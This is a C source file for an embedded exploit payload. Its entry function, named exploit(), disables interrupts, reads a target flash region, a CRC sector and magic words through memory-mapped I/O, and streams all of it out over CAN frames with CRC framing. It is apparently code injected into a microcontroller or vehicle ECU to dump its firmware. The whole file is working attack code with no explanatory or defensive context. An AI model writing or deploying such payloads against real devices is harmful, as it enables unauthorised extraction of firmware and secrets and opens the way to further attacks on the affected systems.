#define LIVE_READ_PAYLOAD 1
#include "patch_common.h"

static int stream_live_region(
  uint8_t slot,
  uint32_t base,
  const struct runtime_guard *guard,
  uint32_t *combined_crc
) {
  uint32_t offset;
  uint32_t region_crc = 0xFFFFFFFFu;
  uint32_t header = ((uint32_t)PROTO_VERSION << 8)
    | ((uint32_t)PROTO_OP_LIVE_READ << 16) | ((uint32_t)slot << 24);

  if (can_send(PROTO_REGION_BEGIN | header, base, guard) != 0) return 1;
  if (can_send(PROTO_REGION_LENGTH | header, TARGET_LENGTH, guard) != 0) return 2;
  for (offset = 0u; offset < TARGET_LENGTH; offset += 4u) {
    uint32_t word = MMIO32(base + offset);
    uint32_t byte_index;
    for (byte_index = 0u; byte_index < 4u; ++byte_index) {
      uint8_t value = (uint8_t)(word >> (byte_index * 8u));
      region_crc = crc32_update(region_crc, value);
      *combined_crc = crc32_update(*combined_crc, value);
    }
    if (send_data((uint16_t)(offset >> 2), word, guard) != 0) return 3;
    if ((offset & 0x7FFu) == 0u) feed_watchdog(guard);
  }
  if (can_send(
    PROTO_REGION_END | header, region_crc ^ 0xFFFFFFFFu, guard
  ) != 0) return 4;
  return 0;
}

static int send_live_read_stream(const struct runtime_guard *guard) {
  uint32_t combined_crc = 0xFFFFFFFFu;
  uint32_t header = ((uint32_t)PROTO_VERSION << 8)
    | ((uint32_t)PROTO_OP_LIVE_READ << 16);

  if (can_send(PROTO_BEGIN0 | header, TARGET_BASE, guard) != 0) return 1;
  if (can_send(PROTO_BEGIN1 | header | (1u << 24), 2u, guard) != 0) return 2;
  if (stream_live_region(0u, TARGET_BASE, guard, &combined_crc) != 0) return 3;
  if (stream_live_region(1u, CRC_SECTOR_BASE, guard, &combined_crc) != 0) return 4;
  if (send_magic(0u, MMIO32(MAGIC0_ADDRESS), guard) != 0) return 5;
  if (send_magic(1u, MMIO32(MAGIC1_ADDRESS), guard) != 0) return 6;
  if (send_status(1u, guard) != 0) return 7;
  if (can_send(PROTO_END, combined_crc ^ 0xFFFFFFFFu, guard) != 0) return 8;
  return 0;
}

void exploit(void) __attribute__((section(".text.entry"), used, noreturn));

void exploit(void) {
  struct runtime_guard guard;
  uint32_t error;

  __asm__ volatile ("di");
  runtime_begin(&guard);
  error = (uint32_t)send_live_read_stream(&guard);
  if (error != 0u) {
    halt_with_error(PROTO_OP_LIVE_READ, 1u, error, &guard);
  }
  runtime_end(&guard);
  for (;;) {
  }
}
